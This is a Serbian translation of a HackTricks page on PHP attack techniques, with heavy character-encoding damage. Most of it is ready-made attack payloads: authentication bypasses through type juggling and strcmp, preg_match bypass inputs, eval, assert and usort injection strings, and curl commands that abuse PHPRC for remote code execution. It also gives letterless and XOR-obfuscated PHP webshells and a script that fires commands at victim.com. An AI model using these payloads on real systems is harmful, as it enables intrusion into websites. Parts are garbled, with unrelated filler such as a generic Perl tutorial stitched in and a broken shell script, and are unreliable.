# PHP Trikovi

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## UobiÄajeno mesto za kolaÄiÄ‡e (Cookies):

Ovo takoÄ‘e vaÅ¾i za kolaÄiÄ‡e phpMyAdmin-a.

KolaÄiÄ‡i:
```
PHPSESSID
phpMyAdmin
```
Lokacije:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Bypassiranje PHP poreÄ‘enja

### Labava poreÄ‘enja/Tip Juggling ( == )

Ako se koristi `==` u PHP-u, postoje neoÄekivani sluÄajevi u kojima poreÄ‘enje ne radi kako se oÄekuje. To je zato Å¡to "==" samo uporeÄ‘uje vrednosti transformisane u isti tip, ako Å¾elite da uporedite i da li je tip uporeÄ‘enih podataka isti, morate koristiti `===`.

Tabele PHP poreÄ‘enja: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` String koji ne poÄinje brojem je jednak broju
* `"0xAAAA" == "43690" -> True` Stringovi sastavljeni od brojeva u dec ili heks formatu mogu biti uporeÄ‘eni sa drugim brojevima/stringovima sa rezultatom True ako su brojevi isti (brojevi u stringu se tumaÄe kao brojevi)
* `"0e3264578" == 0 --> True` String koji poÄinje sa "0e" i koji je praÄ‡en bilo Äim Ä‡e biti jednak 0
* `"0X3264578" == 0X --> True` String koji poÄinje sa "0" i koji je praÄ‡en bilo kojim slovom (X moÅ¾e biti bilo koje slovo) i praÄ‡en bilo Äim Ä‡e biti jednak 0
* `"0e12334" == "0" --> True` Ovo je veoma interesantno jer u nekim sluÄajevima moÅ¾ete kontrolisati string unos "0" i neki sadrÅ¾aj koji se heÅ¡ira i uporeÄ‘uje sa njim. Dakle, ako moÅ¾ete obezbediti vrednost koja Ä‡e stvoriti heÅ¡ koji poÄinje sa "0e" i bez ikakvog slova, moÅ¾ete zaobiÄ‡i poreÄ‘enje. MoÅ¾ete pronaÄ‡i **veÄ‡ heÅ¡irane stringove** sa ovim formatom ovde: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Bilo koje slovo u stringu je jednako celobrojnoj vrednosti 0

ViÅ¡e informacija na [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Tip Juggling** takoÄ‘e utiÄe na funkciju `in_array()` podrazumevano (trebate postaviti treÄ‡i argument na true da biste napravili strogo poreÄ‘enje):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Ako se ova funkcija koristi za **bilo koju provjeru autentifikacije** (kao Å¡to je provjera lozinke) i korisnik kontroliÅ¡e jednu stranu poreÄ‘enja, moÅ¾e poslati prazan niz umesto stringa kao vrednost lozinke (`https://example.com/login.php/?username=admin&password[]=`) i zaobiÄ‡i ovu provjeru:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Isti problem se javlja i sa `strcasecmp()`

### Strogo tipiziranje

ÄŒak i ako se koristi `===`, mogu se javiti greÅ¡ke koje Äine poreÄ‘enje podloÅ¾nim tipiziranju. Na primer, ako se poreÄ‘enje vrÅ¡i konvertovanjem podataka u drugi tip objekta pre poreÄ‘enja:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** moÅ¾e se koristiti za **validaciju korisniÄkog unosa** (proverava da li je bilo koja **reÄ/regex** iz **crne liste** prisutna u **korisniÄkom unosu** i ako nije, kod moÅ¾e nastaviti sa izvrÅ¡avanjem).

#### Bypass za novu liniju

MeÄ‘utim, kada se deliminiÅ¡e poÄetak regexa `preg_match()` **proverava samo prvu liniju korisniÄkog unosa**, pa ako na neki naÄin moÅ¾ete **poslati** unos u **nekoliko linija**, moÅ¾ete zaobiÄ‡i ovu proveru. Primer:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Da biste zaobiÅ¡li ovu provjeru, moÅ¾ete **poslati vrijednost s novim redovima urlencoded** (`%0A`) ili, ako moÅ¾ete poslati **JSON podatke**, poÅ¡aljite ih u **nekoliko linija**:
```php
{
"cmd": "cat /etc/passwd"
}
```
PronaÄ‘ite primer ovde: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Bypass greÅ¡ke duÅ¾ine**

(Ovaj bypass je navodno pokuÅ¡an na PHP 5.2.5 i nisam uspeo da ga pokrenem na PHP 7.3.15)\
Ako moÅ¾ete poslati `preg_match()` funkciji validan veoma **veliki unos**, ona ga **neÄ‡e moÄ‡i obraditi** i moÄ‡i Ä‡ete da **zaobiÄ‘ete** proveru. Na primer, ako je na crnoj listi JSON, moÅ¾ete poslati:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### Bypassiranje ReDoS-a

Trik sa: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Ukratko, problem se javlja jer `preg_*` funkcije u PHP-u koriste [PCRE biblioteku](http://www.pcre.org/) za obradu regularnih izraza. U PCRE-u se odreÄ‘eni regularni izrazi podudaraju koristeÄ‡i mnogo rekurzivnih poziva, Å¡to zauzima puno prostora na steku. MoguÄ‡e je postaviti ograniÄenje na broj dozvoljenih rekurzija, ali u PHP-u je to ograniÄenje [podrazumevano postavljeno na 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), Å¡to je viÅ¡e nego Å¡to stane na stek.

[U ovom Stackoverflow thread-u](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) takoÄ‘e je povezan post gde se detaljnije govori o ovom problemu. NaÅ¡ zadatak je sada bio jasan:\
**Poslati unos koji Ä‡e naterati regex da izvrÅ¡i 100.000+ rekurzija, izazivajuÄ‡i SIGSEGV, Å¡to Ä‡e dovesti do toga da `preg_match()` funkcija vrati `false`, Äime Ä‡e aplikacija smatrati da naÅ¡ unos nije zlonameran, a na kraju payload-a izazvati iznenaÄ‘enje neÄim poput `{system(<veomaopasnakomanda>)}` kako bismo dobili SSTI --> RCE --> zastavica :)**.

Pa, u terminima regularnih izraza, zapravo ne radimo 100k "rekurzija", veÄ‡ brojimo "korake povratka", Å¡to prema [PHP dokumentaciji](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) podrazumevano iznosi 1\_000\_000 (1M) u promenljivoj `pcre.backtrack_limit`.\
Da bismo to postigli, `'X'*500_001` Ä‡e rezultirati sa 1 milion koraka povratka (500k unapred i 500k unazad):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Tipovanje tipova za PHP obfuskaciju

Type juggling is a technique used in PHP to perform implicit type conversions. It can be leveraged for obfuscation purposes, making the code harder to understand and analyze. 

Tipovanje tipova je tehnika koja se koristi u PHP-u za implicitnu konverziju tipova. MoÅ¾e se iskoristiti u svrhu obfuskacije, Äime se kod Äini teÅ¾im za razumijevanje i analizu.

In PHP, type juggling occurs when an operator or function is applied to operands of different types. PHP will automatically convert the operands to a common type before performing the operation. This behavior can be exploited to manipulate the program flow and bypass certain security checks.

U PHP-u, tipovanje tipova se javlja kada se operator ili funkcija primjenjuju na operande razliÄitih tipova. PHP Ä‡e automatski konvertovati operande u zajedniÄki tip prije izvrÅ¡avanja operacije. Ovo ponaÅ¡anje se moÅ¾e iskoristiti za manipulaciju tokom programa i zaobilaÅ¾enje odreÄ‘enih sigurnosnih provjera.

For example, consider the following code snippet:

Na primjer, razmotrite sljedeÄ‡i isjeÄak koda:

```php
$var1 = "10";
$var2 = 10;

if ($var1 == $var2) {
    echo "Equal";
} else {
    echo "Not equal";
}
```

In this case, the `==` operator is used to compare `$var1` and `$var2`. Despite having different types (string and integer), PHP will convert them to a common type (integer) and evaluate the comparison. As a result, the output will be "Equal".

U ovom sluÄaju, operator `==` se koristi za usporedbu `$var1` i `$var2`. Bez obzira na to Å¡to imaju razliÄite tipove (string i integer), PHP Ä‡e ih konvertovati u zajedniÄki tip (integer) i evaluirati usporedbu. Kao rezultat, ispis Ä‡e biti "Equal".

This behavior can be used to obfuscate code by manipulating the types of variables and bypassing certain checks. It is important to be aware of this technique when analyzing PHP code for security vulnerabilities.

Ovo ponaÅ¡anje se moÅ¾e koristiti za obfuskaciju koda manipulacijom tipova varijabli i zaobilaÅ¾enjem odreÄ‘enih provjera. VaÅ¾no je biti svjestan ove tehnike prilikom analize PHP koda u potrazi za sigurnosnim ranjivostima.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## IzvrÅ¡i nakon preusmeravanja (EAR)

Ako PHP preusmerava na drugu stranicu, ali nijedna funkcija **`die`** ili **`exit`** nije **pozvana nakon postavljanja zaglavlja `Location`**, PHP nastavlja izvrÅ¡avanje i dodaje podatke u telo:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## JoÅ¡ trikova

* **register\_globals**: U **PHP < 4.1.1.1** ili ako je loÅ¡e konfigurisan, **register\_globals** moÅ¾e biti aktivan (ili se njihovo ponaÅ¡anje oponaÅ¡a). Ovo implicira da u globalnim varijablama poput $\_GET, ako imaju vrednost npr. $\_GET\["param"]="1234", moÅ¾ete pristupiti tome putem **$param. Dakle, slanjem HTTP parametara moÅ¾ete prebrisati varijable** koje se koriste u kodu.
* **PHPSESSION kolaÄiÄ‡i istog domena se Äuvaju na istom mestu**, stoga ako se unutar domena **koriste razliÄiti kolaÄiÄ‡i na razliÄitim putanjama**, moÅ¾ete postaviti da jedna putanja **pristupa kolaÄiÄ‡u druge putanje** postavljanjem vrednosti kolaÄiÄ‡a druge putanje.\
Na ovaj naÄin, ako **obe putanje pristupaju promenljivoj sa istim imenom**, moÅ¾ete postaviti da **vrednost te promenljive u putanji 1 vaÅ¾i za putanju 2**. A zatim Ä‡e putanja 2 smatrati vaÅ¾eÄ‡im promenljive putanje 1 (dajuÄ‡i kolaÄiÄ‡u ime koje odgovara putanji 2).
* Kada imate **korisniÄka imena** korisnika maÅ¡ine, proverite adresu: **/\~\<KORISNIÄŒKO IME>** da biste videli da li su PHP direktorijumi aktivirani.
* [**LFI i RCE koriÅ¡Ä‡enjem php omotaÄa**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Ove funkcije se obiÄno koriste u PHP-u za **generisanje heÅ¡eva od lozinki** i za **proveru** da li je lozinka ispravna u poreÄ‘enju sa heÅ¡om.\
PodrÅ¾ani algoritmi su: `PASSWORD_DEFAULT` i `PASSWORD_BCRYPT` (poÄinje sa `$2y$`). Imajte na umu da je **PASSWORD\_DEFAULT Äesto isto Å¡to i PASSWORD\_BCRYPT**. Trenutno, **PASSWORD\_BCRYPT** ima **ograniÄenje veliÄine unosa od 72 bajta**. Stoga, kada pokuÅ¡ate da heÅ¡ujete neÅ¡to veÄ‡e od 72 bajta ovim algoritmom, koristiÄ‡e se samo prvih 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### ZaobilaÅ¾enje HTTP zaglavlja zloupotrebom PHP greÅ¡aka

Ako **PHP stranica ispisuje greÅ¡ke i prikazuje unos koji je korisnik pruÅ¾io**, korisnik moÅ¾e naterati PHP server da ispiÅ¡e **dovoljno dugaÄak sadrÅ¾aj** tako da kada pokuÅ¡a **dodati zaglavlja** u odgovor, server Ä‡e baciti greÅ¡ku.\
U sledeÄ‡em scenariju, **napadaÄ je naterao server da izbaci neke velike greÅ¡ke**, i kao Å¡to moÅ¾ete videti na slici, kada je PHP pokuÅ¡ao **izmeniti informacije zaglavlja, nije mogao** (tako da na primer CSP zaglavlje nije poslato korisniku):

![](<../../../.gitbook/assets/image (465).png>)

## IzvrÅ¡avanje koda

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Pogledajte ovo za viÅ¡e korisnih PHP funkcija](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Da bi se izvrÅ¡io kod u "replace" argumentu, potrebno je imati barem jedno poklapanje.\
Ova opcija preg\_replace funkcije je **zastarela od PHP 5.5.0.**

### **RCE putem Eval() funkcije**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE putem Assert()**

Ova funkcija u php-u vam omoguÄ‡ava da **izvrÅ¡ite kod koji je napisan u stringu** kako biste **vratili taÄno ili netaÄno** (i na osnovu toga promenili izvrÅ¡enje). ObiÄno Ä‡e korisniÄka promenljiva biti umetnuta u sredinu stringa. Na primer:\
`assert("strpos($_GET['page']),'..') === false")` --> U ovom sluÄaju, da biste dobili **RCE**, moÅ¾ete uraditi:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Morate **prekinuti** sintaksu koda, **dodati** svoj **payload**, a zatim je ponovo **popraviti**. MoÅ¾ete koristiti **logiÄke operacije** poput "**and" ili "%26%26" ili "|"**. Imajte na umu da "or", "||" ne funkcioniÅ¡u jer ako je prvi uslov taÄan, naÅ¡ payload se neÄ‡e izvrÅ¡iti. Isto tako, ";" ne funkcioniÅ¡e jer naÅ¡ payload neÄ‡e biti izvrÅ¡en.

**Druga opcija** je dodati izvrÅ¡avanje komande u string: `'.highlight_file('.passwd').'`

**Druga opcija** (ako imate interni kod) je izmeniti neku promenljivu da biste promenili izvrÅ¡avanje: `$file = "hola"`

### **RCE putem usort()**

Ova funkcija se koristi za sortiranje niza stavki koristeÄ‡i odreÄ‘enu funkciju.\
Da biste zloupotrebili ovu funkciju:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
MoÅ¾ete koristiti **//** za komentarisanje ostatka koda.

Da biste otkrili broj zagrada koje trebate zatvoriti:

* `?order=id;}//`: dobijamo poruku o greÅ¡ci (`Parse error: syntax error, unexpected ';'`). Verovatno nam nedostaje jedna ili viÅ¡e zagrada.
* `?order=id);}//`: dobijamo **upozorenje**. To izgleda ispravno.
* `?order=id));}//`: dobijamo poruku o greÅ¡ci (`Parse error: syntax error, unexpected ')' i`). Verovatno imamo previÅ¡e zatvorenih zagrada.

### **RCE putem .httaccess**

Ako moÅ¾ete **uÄitati** **.htaccess**, onda moÅ¾ete **konfigurisati** nekoliko stvari i Äak izvrÅ¡iti kod (konfigurisanjem da se fajlovi sa ekstenzijom .htaccess mogu **izvrÅ¡iti**).

RazliÄiti .htaccess Å¡koljke mogu se pronaÄ‡i [ovde](https://github.com/wireghoul/htshells)

### RCE putem Env promenljivih

Ako pronaÄ‘ete ranjivost koja vam omoguÄ‡ava da **izmenite env promenljive u PHP-u** (i joÅ¡ jednu za otpremanje fajlova, mada uz viÅ¡e istraÅ¾ivanja moÅ¾da se to moÅ¾e zaobiÄ‡i), moÅ¾ete iskoristiti ovaj ponaÅ¡anje da biste dobili **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Ova env promenljiva omoguÄ‡ava vam da uÄitate proizvoljne biblioteke prilikom izvrÅ¡avanja drugih binarnih fajlova (mada u ovom sluÄaju moÅ¾da neÄ‡e raditi).
* **`PHPRC`** : InstruiÅ¡e PHP **gde da pronaÄ‘e svoj konfiguracioni fajl**, obiÄno nazvan `php.ini`. Ako moÅ¾ete otpremiti svoj sopstveni konfiguracioni fajl, koristite `PHPRC` da usmerite PHP na njega. Dodajte unos **`auto_prepend_file`** koji navodi drugi otpremljeni fajl. Taj drugi fajl sadrÅ¾i normalan **PHP kod koji se zatim izvrÅ¡ava** od strane PHP izvrÅ¡nog okruÅ¾enja pre bilo kog drugog koda.
1. Otpremite PHP fajl koji sadrÅ¾i naÅ¡ shell kod
2. Otpremite drugi fajl koji sadrÅ¾i direktivu **`auto_prepend_file`** koja instruiÅ¡e PHP preprocesor da izvrÅ¡i fajl koji smo otpremili u koraku 1
3. Postavite promenljivu `PHPRC` na fajl koji smo otpremili u koraku 2.
* Dobijte viÅ¡e informacija o tome kako izvrÅ¡iti ovaj lanac [**iz originalnog izveÅ¡taja**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - joÅ¡ jedna opcija
* Ako **ne moÅ¾ete otpremiti fajlove**, moÅ¾ete koristiti u FreeBSD-u "fajl" `/dev/fd/0` koji sadrÅ¾i **`stdin`**, tj. **telo** zahteva poslatog na `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Ili da biste dobili RCE, omoguÄ‡ite **`allow_url_include`** i dodajte fajl sa **base64 PHP kodom**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Tehnika [**iz ovog izveÅ¡taja**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## PHP statiÄka analiza

Pogledajte da li moÅ¾ete ubaciti kod u pozive ovih funkcija (sa [ovog](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be) mesta):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Ako debagujete PHP aplikaciju, moÅ¾ete globalno omoguÄ‡iti prikazivanje greÅ¡aka u `/etc/php5/apache2/php.ini` dodavanjem `display_errors = On` i restartovati apache: `sudo systemctl restart apache2`

### Deobfuskacija PHP koda

MoÅ¾ete koristiti **veb**[ **www.unphp.net**](http://www.unphp.net) **za deobfuskaciju PHP koda.**

## PHP omotaÄi i protokoli

PHP omotaÄi i protokoli mogu vam omoguÄ‡iti da **zaobiÄ‘ete zaÅ¡titu pisanja i Äitanja** u sistemu i kompromitujete ga. Za [**viÅ¡e informacija pogledajte ovu stranicu**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug neautentifikovani RCE

Ako vidite da je **Xdebug** **omoguÄ‡en** u izlazu `phpconfig()`, trebali biste pokuÅ¡ati dobiti RCE putem [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Promenljive promenljivih
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Zloupotreba RCE-a koristeÄ‡i novi $\_GET\["a"]\($\_GET\["b"])

Ako na stranici moÅ¾ete **kreirati novi objekat proizvoljne klase**, moÅ¾da Ä‡ete moÄ‡i dobiti RCE, proverite sledeÄ‡u stranicu da biste saznali kako:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## IzvrÅ¡avanje PHP koda bez slova

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### KoriÅ¡Ä‡enje oktalnog sistema
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR) je logiÄki operator koji se koristi za izvrÅ¡avanje ekskluzivne disjunkcije izmeÄ‘u dva izraza. U kontekstu hakovanja, XOR se Äesto koristi za enkripciju i dekripciju podataka.

XOR enkripcija se postiÅ¾e kombinovanjem podataka sa kljuÄem koristeÄ‡i XOR operaciju. KljuÄ se moÅ¾e sastojati od niza bitova ili bajtova. Kada se primeni XOR operacija na podatke i kljuÄ, rezultat je kriptovani podatak. Da bi se dekriptovali podaci, isti kljuÄ se ponovo primenjuje na kriptovane podatke koristeÄ‡i XOR operaciju.

XOR operacija je posebno korisna u hakovanju jer moÅ¾e biti koriÅ¡Ä‡ena za skrivanje ili oteÅ¾avanje otkrivanja odreÄ‘enih informacija. Na primer, XOR moÅ¾e biti koriÅ¡Ä‡en za enkripciju lozinke ili za skrivanje kljuÄnih informacija u malveru.

Kada se koristi u kontekstu hakovanja, XOR moÅ¾e biti veoma moÄ‡an alat. MeÄ‘utim, vaÅ¾no je napomenuti da XOR enkripcija nije dovoljno jaka sama po sebi i da se Äesto koristi u kombinaciji sa drugim enkripcijskim tehnikama radi postizanja veÄ‡e sigurnosti.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If Â¢___ not needed then $_($__), show_source(.passwd)
```
### XOR jednostavan shell kod

Prema [**ovom objaÅ¡njenju**](https://mgp25.com/ctf/Web-challenge/), moguÄ‡e je generisati jednostavan shell kod na sledeÄ‡i naÄin:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Dakle, ako moÅ¾ete **izvrÅ¡iti proizvoljni PHP bez brojeva i slova**, moÅ¾ete poslati zahtev kao Å¡to je sledeÄ‡e zloupotrebljavajuÄ‡i taj payload za izvrÅ¡avanje proizvoljnog PHP koda:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Za detaljnije objaÅ¡njenje pogledajte [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (unutar eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl sliÄno

Perl je interpretirani jezik visokog nivoa koji se Äesto koristi za obradu teksta i automatizaciju zadataka. Ima mnoge sliÄnosti sa PHP-om, ali se koristi na razliÄitim platformama i ima neke specifiÄne karakteristike.

#### Osnovna sintaksa

Perl koristi `$` za deklarisanje promenljivih, kao i PHP. Na primer:

```perl
$broj = 10;
$niska = "Hello, world!";
@niz = (1, 2, 3, 4, 5);
%hash = ('kljuc1', 'vrednost1', 'kljuc2', 'vrednost2');
```

#### Rad sa nizovima

Perl ima bogat skup funkcija za rad sa nizovima. Na primer, moÅ¾ete koristiti `push` funkciju za dodavanje elemenata na kraj niza:

```perl
@niz = (1, 2, 3);
push(@niz, 4);
```

#### Rad sa stringovima

Perl takoÄ‘e ima mnoge funkcije za rad sa stringovima. Na primer, moÅ¾ete koristiti `length` funkciju za dobijanje duÅ¾ine stringa:

```perl
$niska = "Hello, world!";
$duljina = length($niska);
```

#### Rad sa regularnim izrazima

Perl je poznat po svojoj podrÅ¡ci za regularne izraze. MoÅ¾ete koristiti regularne izraze za pretragu i manipulaciju stringova. Na primer, moÅ¾ete koristiti `=~` operator za proveru da li string odgovara odreÄ‘enom obrascu:

```perl
$niska = "Hello, world!";
if ($niska =~ /world/) {
    print "String sadrÅ¾i 'world'.";
}
```

#### IzvrÅ¡avanje sistema

Perl vam omoguÄ‡ava izvrÅ¡avanje sistema i komandnih linija. Na primer, moÅ¾ete koristiti `system` funkciju za izvrÅ¡avanje komande:

```perl
system("ls -l");
```

#### ZakljuÄak

Perl je moÄ‡an jezik koji ima mnoge sliÄnosti sa PHP-om. Ako ste veÄ‡ upoznati sa PHP-om, lako Ä‡ete se prilagoditi Perl-u i iskoristiti njegove funkcionalnosti za obradu teksta i automatizaciju zadataka.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
